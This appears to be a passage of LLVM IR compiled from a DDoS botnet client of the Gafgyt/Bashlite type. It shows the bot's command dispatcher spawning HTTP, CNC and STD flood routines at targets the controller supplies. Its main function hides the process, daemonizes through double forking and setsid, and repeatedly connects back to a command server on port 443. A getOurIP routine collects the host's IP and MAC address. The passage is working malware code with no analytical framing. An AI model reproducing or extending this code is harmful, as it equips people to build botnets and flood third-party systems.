  %198 = icmp eq i8* %197, null
  br i1 %198, label %.loopexit159.loopexit, label %199

; <label>:199:                                    ; preds = %.preheader158
  %200 = tail call i32 @listFork()
  %201 = icmp eq i32 %200, 0
  br i1 %201, label %.preheader157.preheader, label %.preheader158

.preheader157.preheader:                          ; preds = %199
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  %202 = load i32, i32* @mainCommSock, align 4
  %203 = tail call i32 @close(i32 %202) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:204:                                    ; preds = %193
  %205 = tail call i32 @listFork()
  %206 = icmp eq i32 %205, 0
  br i1 %206, label %.preheader.preheader, label %294

.preheader.preheader:                             ; preds = %204
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  tail call void @sendHTTP(i8* %195, i32 %191)
  %207 = load i32, i32* @mainCommSock, align 4
  %208 = tail call i32 @close(i32 %207) #3
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit159.loopexit:                            ; preds = %.preheader158
  %.pre180 = load i8*, i8** %1, align 8
  br label %.loopexit159

.loopexit159:                                     ; preds = %.loopexit159.loopexit, %.loopexit161
  %209 = phi i8* [ %.pre180, %.loopexit159.loopexit ], [ %183, %.loopexit161 ]
  %210 = tail call i32 @strcmp(i8* %209, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i64 0, i64 0)) #15
  %211 = icmp eq i32 %210, 0
  br i1 %211, label %212, label %.loopexit156

; <label>:212:                                    ; preds = %.loopexit159
  %213 = icmp slt i32 %0, 4
  br i1 %213, label %294, label %214

; <label>:214:                                    ; preds = %212
  %215 = getelementptr inbounds i8*, i8** %1, i64 2
  %216 = load i8*, i8** %215, align 8
  %217 = tail call i32 @atoi(i8* %216) #15
  %218 = icmp slt i32 %217, 1
  br i1 %218, label %294, label %219

; <label>:219:                                    ; preds = %214
  %220 = getelementptr inbounds i8*, i8** %1, i64 3
  %221 = load i8*, i8** %220, align 8
  %222 = tail call i32 @atoi(i8* %221) #15
  %223 = icmp slt i32 %222, 1
  br i1 %223, label %294, label %224

; <label>:224:                                    ; preds = %219
  %225 = getelementptr inbounds i8*, i8** %1, i64 1
  %226 = load i8*, i8** %225, align 8
  %strchr144 = tail call i8* @strchr(i8* %226, i32 44)
  %227 = icmp eq i8* %strchr144, null
  br i1 %227, label %236, label %.preheader155.preheader

.preheader155.preheader:                          ; preds = %224
  br label %.preheader155

.preheader155:                                    ; preds = %.preheader155.preheader, %230
  %.sink150 = phi i8* [ null, %230 ], [ %226, %.preheader155.preheader ]
  %228 = tail call i8* @strtok(i8* %.sink150, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #3
  %229 = icmp eq i8* %228, null
  br i1 %229, label %.loopexit156.loopexit, label %230

; <label>:230:                                    ; preds = %.preheader155
  %231 = tail call i32 @listFork()
  %232 = icmp eq i32 %231, 0
  br i1 %232, label %233, label %.preheader155

; <label>:233:                                    ; preds = %230
  tail call void @sendCNC(i8* nonnull %228, i32 %217, i32 %222)
  %234 = load i32, i32* @mainCommSock, align 4
  %235 = tail call i32 @close(i32 %234) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:236:                                    ; preds = %224
  %237 = tail call i32 @listFork()
  %238 = icmp eq i32 %237, 0
  br i1 %238, label %239, label %294

; <label>:239:                                    ; preds = %236
  tail call void @sendCNC(i8* %226, i32 %217, i32 %222)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit156.loopexit:                            ; preds = %.preheader155
  %.pre181 = load i8*, i8** %1, align 8
  br label %.loopexit156

.loopexit156:                                     ; preds = %.loopexit156.loopexit, %.loopexit159
  %240 = phi i8* [ %.pre181, %.loopexit156.loopexit ], [ %209, %.loopexit159 ]
  %241 = tail call i32 @strcmp(i8* %240, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.109, i64 0, i64 0)) #15
  %242 = icmp eq i32 %241, 0
  br i1 %242, label %243, label %.loopexit154

; <label>:243:                                    ; preds = %.loopexit156
  %244 = icmp slt i32 %0, 4
  br i1 %244, label %294, label %245

; <label>:245:                                    ; preds = %243
  %246 = getelementptr inbounds i8*, i8** %1, i64 2
  %247 = load i8*, i8** %246, align 8
  %248 = tail call i32 @atoi(i8* %247) #15
  %249 = icmp slt i32 %248, 1
  br i1 %249, label %294, label %250

; <label>:250:                                    ; preds = %245
  %251 = getelementptr inbounds i8*, i8** %1, i64 3
  %252 = load i8*, i8** %251, align 8
  %253 = tail call i32 @atoi(i8* %252) #15
  %254 = icmp slt i32 %253, 1
  br i1 %254, label %294, label %255

; <label>:255:                                    ; preds = %250
  %256 = getelementptr inbounds i8*, i8** %1, i64 1
  %257 = load i8*, i8** %256, align 8
  %strchr145 = tail call i8* @strchr(i8* %257, i32 44)
  %258 = icmp eq i8* %strchr145, null
  br i1 %258, label %265, label %.preheader153.preheader

.preheader153.preheader:                          ; preds = %255
  br label %.preheader153

.preheader153:                                    ; preds = %.preheader153.preheader, %261
  %.sink151 = phi i8* [ null, %261 ], [ %257, %.preheader153.preheader ]
  %259 = tail call i8* @strtok(i8* %.sink151, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #3
  %260 = icmp eq i8* %259, null
  br i1 %260, label %.loopexit154.loopexit, label %261

; <label>:261:                                    ; preds = %.preheader153
  %262 = tail call i32 @listFork()
  %263 = icmp eq i32 %262, 0
  br i1 %263, label %264, label %.preheader153

; <label>:264:                                    ; preds = %261
  tail call void @sendSTD(i8* nonnull %259, i32 %248, i32 %253)
  unreachable

; <label>:265:                                    ; preds = %255
  %266 = tail call i32 @listFork()
  %267 = icmp eq i32 %266, 0
  br i1 %267, label %268, label %294

; <label>:268:                                    ; preds = %265
  tail call void @sendSTD(i8* %257, i32 %248, i32 %253)
  unreachable

.loopexit154.loopexit:                            ; preds = %.preheader153
  %.pre182 = load i8*, i8** %1, align 8
  br label %.loopexit154

.loopexit154:                                     ; preds = %.loopexit154.loopexit, %.loopexit156
  %269 = phi i8* [ %.pre182, %.loopexit154.loopexit ], [ %240, %.loopexit156 ]
  %270 = tail call i32 @strcmp(i8* %269, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.110, i64 0, i64 0)) #15
  %271 = icmp eq i32 %270, 0
  %272 = load i64, i64* @numpids, align 8
  %273 = icmp ne i64 %272, 0
  %or.cond173 = and i1 %271, %273
  br i1 %or.cond173, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit154
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %286
  %.0170 = phi i64 [ %287, %286 ], [ 0, %.lr.ph.preheader ]
  %274 = load i32*, i32** @pids, align 8
  %275 = getelementptr inbounds i32, i32* %274, i64 %.0170
  %276 = load i32, i32* %275, align 4
  %277 = icmp eq i32 %276, 0
  br i1 %277, label %286, label %278

; <label>:278:                                    ; preds = %.lr.ph
  %279 = tail call i32 @getpid() #3
  %280 = icmp eq i32 %276, %279
  br i1 %280, label %286, label %281

; <label>:281:                                    ; preds = %278
  %282 = load i32*, i32** @pids, align 8
  %283 = getelementptr inbounds i32, i32* %282, i64 %.0170
  %284 = load i32, i32* %283, align 4
  %285 = tail call i32 @kill(i32 %284, i32 9) #3
  br label %286

; <label>:286:                                    ; preds = %278, %.lr.ph, %281
  %287 = add i64 %.0170, 1
  %288 = load i64, i64* @numpids, align 8
  %289 = icmp ult i64 %287, %288
  br i1 %289, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %286
  %.pre183 = load i8*, i8** %1, align 8
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit154
  %290 = phi i8* [ %.pre183, %.loopexit.loopexit ], [ %269, %.loopexit154 ]
  %291 = tail call i32 @strcmp(i8* %290, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.111, i64 0, i64 0)) #15
  %292 = icmp eq i32 %291, 0
  br i1 %292, label %293, label %294

; <label>:293:                                    ; preds = %.loopexit
  tail call void @exit(i32 0) #17
  unreachable

; <label>:294:                                    ; preds = %.loopexit, %265, %236, %204, %179, %113, %243, %245, %250, %212, %214, %219, %186, %188, %120, %122, %127, %132, %140, %147, %62, %64, %69, %74, %79, %88, %30, %56, %46, %22, %12, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 4096, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #3
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #3
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #15
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #15
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 443, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.112, i64 0, i64 0)) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #18
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #3
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.113, i64 0, i64 0), i32 0) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i64 0, i64 0)) #15
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #3
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #3
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #3
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #3
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #14 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i64 0, i64 0)
}

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #13 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [1024 x i8], align 16
  %6 = alloca [10 x i8*], align 16
  %7 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.117, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i64 0, i64 0))
  %8 = load i8*, i8** %1, align 8
  %9 = tail call i64 @strlen(i8* %8) #15
  tail call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 %9, i32 1, i1 false)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i64 0, i64 0), i8** %1, align 8
  %10 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([1 x i8]* @.str.116 to i64), i32 0, i32 0, i32 0) #3
  %11 = tail call i64 @time(i64* null) #3
  %12 = tail call i32 @getpid() #3
  %13 = zext i32 %12 to i64
  %14 = xor i64 %13, %11
  %15 = trunc i64 %14 to i32
  tail call void @srand(i32 %15) #3
  %16 = tail call i64 @time(i64* null) #3
  %17 = tail call i32 @getpid() #3
  %18 = zext i32 %17 to i64
  %19 = xor i64 %18, %16
  %20 = trunc i64 %19 to i32
  tail call void @init_rand(i32 %20)
  %21 = tail call i32 @getOurIP()
  %22 = tail call i32 @fork() #3
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %26, label %24

; <label>:24:                                     ; preds = %2
  %25 = call i32 @waitpid(i32 %22, i32* nonnull %3, i32 0) #3
  call void @exit(i32 0) #17
  unreachable

; <label>:26:                                     ; preds = %2
  %27 = tail call i32 @fork() #3
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %30, label %29

; <label>:29:                                     ; preds = %26
  tail call void @exit(i32 0) #17
  unreachable

; <label>:30:                                     ; preds = %26
  %31 = tail call i32 @setsid() #3
  %32 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i64 0, i64 0)) #3
  %33 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %35 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %36 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 0
  br label %.backedge84

.backedge84.loopexit:                             ; preds = %.backedge
  br label %.backedge84.backedge

.backedge84:                                      ; preds = %.backedge84.backedge, %30
  %37 = call i32 @initConnection()
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %41, label %39

; <label>:39:                                     ; preds = %.backedge84
  %40 = call i32 @sleep(i32 5) #3
  br label %.backedge84.backedge

; <label>:41:                                     ; preds = %.backedge84
  %42 = load i32, i32* @mainCommSock, align 4
  %43 = call i32 (i32, i8*, ...) @sockprintf(i32 %42, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.120, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i64 0, i64 0))
  %44 = load i32, i32* @mainCommSock, align 4
  %45 = call i32 @recvLine(i32 %44, i8* nonnull %34, i32 4096)
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %.backedge84.backedge, label %.preheader82.preheader

.backedge84.backedge:                             ; preds = %41, %39, %.backedge84.loopexit
  br label %.backedge84

.preheader82.preheader:                           ; preds = %41
  br label %.preheader82

.preheader82:                                     ; preds = %.preheader82.preheader, %.backedge
  %47 = phi i32 [ %97, %.backedge ], [ %45, %.preheader82.preheader ]
  %48 = load i64, i64* @numpids, align 8
  %49 = icmp eq i64 %48, 0
  br i1 %49, label %._crit_edge101, label %.lr.ph100.preheader

.lr.ph100.preheader:                              ; preds = %.preheader82
  br label %.lr.ph100

.lr.ph100:                                        ; preds = %.lr.ph100.preheader, %.lr.ph100._crit_edge
  %indvars.iv = phi i64 [ %55, %.lr.ph100._crit_edge ], [ 0, %.lr.ph100.preheader ]
  %50 = load i32*, i32** @pids, align 8
  %51 = getelementptr inbounds i32, i32* %50, i64 %indvars.iv
  %52 = load i32, i32* %51, align 4
  %53 = call i32 @waitpid(i32 %52, i32* null, i32 1) #3
  %54 = icmp sgt i32 %53, 0
  %55 = add nuw i64 %indvars.iv, 1
  br i1 %54, label %.preheader, label %.lr.ph100._crit_edge

.preheader:                                       ; preds = %.lr.ph100
  %56 = load i64, i64* @numpids, align 8
  %57 = icmp ult i64 %55, %56
  %58 = load i32*, i32** @pids, align 8
  %59 = trunc i64 %indvars.iv to i32
  br i1 %57, label %.lr.ph91.preheader, label %._crit_edge92

.lr.ph91.preheader:                               ; preds = %.preheader
  %60 = trunc i64 %55 to i32
  br label %.lr.ph91

.lr.ph91:                                         ; preds = %.lr.ph91.preheader, %.lr.ph91
  %61 = phi i32* [ %70, %.lr.ph91 ], [ %58, %.lr.ph91.preheader ]
  %62 = phi i64 [ %67, %.lr.ph91 ], [ %55, %.lr.ph91.preheader ]
  %.07190 = phi i32 [ %.071, %.lr.ph91 ], [ %60, %.lr.ph91.preheader ]
  %.071.in89 = phi i32 [ %.07190, %.lr.ph91 ], [ %59, %.lr.ph91.preheader ]
  %63 = getelementptr inbounds i32, i32* %61, i64 %62
  %64 = load i32, i32* %63, align 4
  %65 = zext i32 %.071.in89 to i64
  %66 = getelementptr inbounds i32, i32* %61, i64 %65
  store i32 %64, i32* %66, align 4
  %.071 = add i32 %.07190, 1
  %67 = zext i32 %.071 to i64
  %68 = load i64, i64* @numpids, align 8
  %69 = icmp ult i64 %67, %68
  %70 = load i32*, i32** @pids, align 8
  br i1 %69, label %.lr.ph91, label %._crit_edge92.loopexit

._crit_edge92.loopexit:                           ; preds = %.lr.ph91
  br label %._crit_edge92

._crit_edge92:                                    ; preds = %._crit_edge92.loopexit, %.preheader
  %.071.in.lcssa = phi i32 [ %59, %.preheader ], [ %.07190, %._crit_edge92.loopexit ]
  %.lcssa = phi i32* [ %58, %.preheader ], [ %70, %._crit_edge92.loopexit ]
  %71 = zext i32 %.071.in.lcssa to i64
  %72 = getelementptr inbounds i32, i32* %.lcssa, i64 %71
  store i32 0, i32* %72, align 4
  %73 = load i64, i64* @numpids, align 8
  %74 = add i64 %73, -1
  store i64 %74, i64* @numpids, align 8
  %75 = shl i64 %73, 2
  %76 = call noalias i8* @malloc(i64 %75) #3
  %77 = bitcast i8* %76 to i32*
  %78 = icmp eq i64 %74, 0
  %79 = load i32*, i32** @pids, align 8
  br i1 %78, label %._crit_edge97, label %.lr.ph96.preheader

.lr.ph96.preheader:                               ; preds = %._crit_edge92
  br label %.lr.ph96

.lr.ph96:                                         ; preds = %.lr.ph96.preheader, %.lr.ph96
  %80 = phi i64 [ %85, %.lr.ph96 ], [ 0, %.lr.ph96.preheader ]
  %.17294 = phi i32 [ %84, %.lr.ph96 ], [ 0, %.lr.ph96.preheader ]
  %81 = getelementptr inbounds i32, i32* %79, i64 %80
  %82 = load i32, i32* %81, align 4
  %83 = getelementptr inbounds i32, i32* %77, i64 %80
  store i32 %82, i32* %83, align 4
  %84 = add i32 %.17294, 1
  %85 = zext i32 %84 to i64
  %86 = icmp ult i64 %85, %74
  br i1 %86, label %.lr.ph96, label %._crit_edge97.loopexit

._crit_edge97.loopexit:                           ; preds = %.lr.ph96
  br label %._crit_edge97

._crit_edge97:                                    ; preds = %._crit_edge97.loopexit, %._crit_edge92
  %87 = bitcast i32* %79 to i8*
  call void @free(i8* %87) #3
  store i8* %76, i8** bitcast (i32** @pids to i8**), align 8
  br label %.lr.ph100._crit_edge

.lr.ph100._crit_edge:                             ; preds = %.lr.ph100, %._crit_edge97
  %sext = shl i64 %55, 32
  %88 = ashr exact i64 %sext, 32
  %89 = load i64, i64* @numpids, align 8
  %90 = icmp ult i64 %88, %89
  br i1 %90, label %.lr.ph100, label %._crit_edge101.loopexit

._crit_edge101.loopexit:                          ; preds = %.lr.ph100._crit_edge
  br label %._crit_edge101

._crit_edge101:                                   ; preds = %._crit_edge101.loopexit, %.preheader82
  %91 = sext i32 %47 to i64
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %91
  store i8 0, i8* %92, align 1
  call void @trim(i8* nonnull %34)
  %strncmp = call i32 @strncmp(i8* nonnull %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %93, label %99

; <label>:93:                                     ; preds = %._crit_edge101
  %94 = load i32, i32* @mainCommSock, align 4
  %95 = call i32 (i32, i8*, ...) @sockprintf(i32 %94, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.121, i64 0, i64 0))
  br label %.backedge

.backedge.loopexit:                               ; preds = %.lr.ph113
  br label %.backedge

.backedge.loopexit131:                            ; preds = %.preheader114
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit131, %.backedge.loopexit, %._crit_edge110.thread, %93, %._crit_edge110, %101, %133
  %96 = load i32, i32* @mainCommSock, align 4
  %97 = call i32 @recvLine(i32 %96, i8* nonnull %34, i32 4096)
  %98 = icmp eq i32 %97, -1
  br i1 %98, label %.backedge84.loopexit, label %.preheader82

; <label>:99:                                     ; preds = %._crit_edge101
  %strncmp74 = call i32 @strncmp(i8* nonnull %34, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.122, i64 0, i64 0), i64 3)
  %cmp75 = icmp eq i32 %strncmp74, 0
  br i1 %cmp75, label %100, label %101

; <label>:100:                                    ; preds = %99
  call void @exit(i32 0) #17
  unreachable

; <label>:101:                                    ; preds = %99
  %102 = load i8, i8* %34, align 16
  %103 = icmp eq i8 %102, 33
  br i1 %103, label %.preheader114.preheader, label %.backedge

.preheader114.preheader:                          ; preds = %101
  br label %.preheader114

.preheader114:                                    ; preds = %.preheader114.preheader, %105
  %.069 = phi i8* [ %106, %105 ], [ %35, %.preheader114.preheader ]
  %104 = load i8, i8* %.069, align 1
  switch i8 %104, label %105 [
    i8 0, label %.backedge.loopexit131
    i8 32, label %107
  ]

; <label>:105:                                    ; preds = %.preheader114
  %106 = getelementptr inbounds i8, i8* %.069, i64 1
  br label %.preheader114

; <label>:107:                                    ; preds = %.preheader114
  store i8 0, i8* %.069, align 1
  %108 = call i64 @strlen(i8* %35) #15
  %109 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %108
  %110 = getelementptr inbounds i8, i8* %109, i64 2
  br label %111

; <label>:111:                                    ; preds = %116, %107
  %112 = call i64 @strlen(i8* %110) #15
  %113 = add i64 %112, -1
  %114 = getelementptr inbounds i8, i8* %110, i64 %113
  %115 = load i8, i8* %114, align 1
  switch i8 %115, label %.preheader80.preheader [
    i8 13, label %116
    i8 10, label %116
  ]

.preheader80.preheader:                           ; preds = %111
  br label %.preheader80

; <label>:116:                                    ; preds = %111, %111
  store i8 0, i8* %114, align 1
  br label %111

.preheader80:                                     ; preds = %.preheader80.preheader, %118
  %.070 = phi i8* [ %119, %118 ], [ %110, %.preheader80.preheader ]
  %117 = load i8, i8* %.070, align 1
  switch i8 %117, label %118 [
    i8 32, label %120
    i8 0, label %120
  ]

; <label>:118:                                    ; preds = %.preheader80
  %119 = getelementptr inbounds i8, i8* %.070, i64 1
  br label %.preheader80

; <label>:120:                                    ; preds = %.preheader80, %.preheader80
  store i8 0, i8* %.070, align 1
  %121 = getelementptr inbounds i8, i8* %.070, i64 1
  %122 = load i8, i8* %110, align 1
  %123 = icmp eq i8 %122, 0
  br i1 %123, label %._crit_edge105, label %.lr.ph104.preheader

.lr.ph104.preheader:                              ; preds = %120
  br label %.lr.ph104

.lr.ph104:                                        ; preds = %.lr.ph104.preheader, %.lr.ph104
  %124 = phi i8 [ %129, %.lr.ph104 ], [ %122, %.lr.ph104.preheader ]
  %.067102 = phi i8* [ %128, %.lr.ph104 ], [ %110, %.lr.ph104.preheader ]
  %125 = zext i8 %124 to i32
  %126 = call i32 @toupper(i32 %125) #15
  %127 = trunc i32 %126 to i8
  store i8 %127, i8* %.067102, align 1
  %128 = getelementptr inbounds i8, i8* %.067102, i64 1
  %129 = load i8, i8* %128, align 1
  %130 = icmp eq i8 %129, 0
  br i1 %130, label %._crit_edge105.loopexit, label %.lr.ph104

._crit_edge105.loopexit:                          ; preds = %.lr.ph104
  br label %._crit_edge105

._crit_edge105:                                   ; preds = %._crit_edge105.loopexit, %120
  %131 = call i32 @strcmp(i8* %110, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.123, i64 0, i64 0)) #15
  %132 = icmp eq i32 %131, 0
  br i1 %132, label %133, label %146

; <label>:133:                                    ; preds = %._crit_edge105
  %134 = call i32 @listFork()
  %135 = icmp eq i32 %134, 0
  br i1 %135, label %136, label %.backedge

; <label>:136:                                    ; preds = %133
  %137 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %137, i8 0, i64 1024, i32 16, i1 false)
